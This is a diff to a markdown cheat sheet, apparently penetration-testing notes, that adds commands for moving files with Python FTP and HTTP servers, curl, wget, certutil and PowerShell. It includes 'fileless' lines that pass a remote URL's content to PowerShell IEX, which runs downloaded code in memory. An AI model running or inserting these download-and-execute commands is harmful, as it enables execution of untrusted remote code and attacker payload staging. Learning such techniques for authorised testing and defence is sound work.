@@ -12,7 +12,7 @@ sudo apt install python3-pyftpdlib
 ```
 python3 -m pyftpdlib -p 21 --write
 ```
-- Download
+### Download
 ```
 # Linux
 
@@ -22,9 +22,37 @@ python3 -m pyftpdlib -p 21 --write
 # Windows CMD
 ftp [hostname/IP]
 ```
-## Simple Python HTTP Server
+### Upload
+## HTTP
+### Simple Python HTTP Server
 ```
 python3 -m http.server [port]
+```
+### Download (Linux)
+```
+# Just browse to it using a browser
+
+# Curl
+curl -o [filename] [url]
+
+# wget
+wget http(s)://[url] -O [filename]
+```
+### Download (Windows)
+```
+# Again, use a browser
+
+# Certutil
+certutil -urlcache -f "URL" "filename"
+
+# Powershell File Download Example
+(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+
+# Powershell Fileless Download Example
+IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
+# We can also pipe the input directly into IEX
+(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
 ```
 ## Base64 Encode/Decode
 ```
